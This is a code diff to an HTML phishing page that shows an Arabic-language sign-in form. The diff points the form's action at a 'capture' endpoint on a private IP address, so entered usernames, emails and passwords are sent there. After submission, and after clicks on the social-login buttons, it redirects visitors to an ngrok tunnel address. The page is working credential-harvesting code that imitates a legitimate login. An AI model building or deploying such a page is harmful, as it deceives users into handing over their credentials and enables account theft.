@@ -65,7 +65,7 @@
     <div class="card" aria-labelledby="signin-heading">
       <h2 id="signin-heading" style="margin:0 0 12px 0;text-align:center;font-size:20px;font-weight:700;color:#0b1720">تسجيل الدخول</h2>
 
-      <form id="login-form" action="http://YOUR_IP/capture" method="POST" autocomplete="off">
+      <form id="login-form" action="http://172.16.132.133/capture" method="POST" autocomplete="off">
         <div class="input">
           <label for="email">البريد الإلكتروني أو اسم المستخدم</label>
           <input id="email" name="email" type="text" placeholder="مثال: name@example.com" aria-label="Email or username" required>
@@ -96,16 +96,24 @@
 
   <script>
     document.getElementById('login-form').addEventListener('submit', function(e) {
-      setTimeout(() => {
-        window.location.href = 'https://lora-reconciliatory-jacinto.ngrok-free.dev';
-      }, 500);
+      const sure = confirm("هل أنت متأكد من إرسال المعلومات؟");
+      if (!sure) {
+        e.preventDefault();
+      } else {
+        setTimeout(() => {
+          window.location.href = 'https://lora-reconciliatory-jacinto.ngrok-free.app';
+        }, 1000);
+      }
     });
 
     document.querySelectorAll('.social-btn').forEach(btn => {
       btn.addEventListener('click', function() {
-        setTimeout(() => {
-          window.location.href = 'https://lora-reconciliatory-jacinto.ngrok-free.dev';
-        }, 500);
+        const sure = confirm("هل أنت متأكد من استخدام حسابك الاجتماعي؟");
+        if (sure) {
+          setTimeout(() => {
+            window.location.href = 'https://lora-reconciliatory-jacinto.ngrok-free.app';
+          }, 1000);
+        }
       });
     });
   </script>
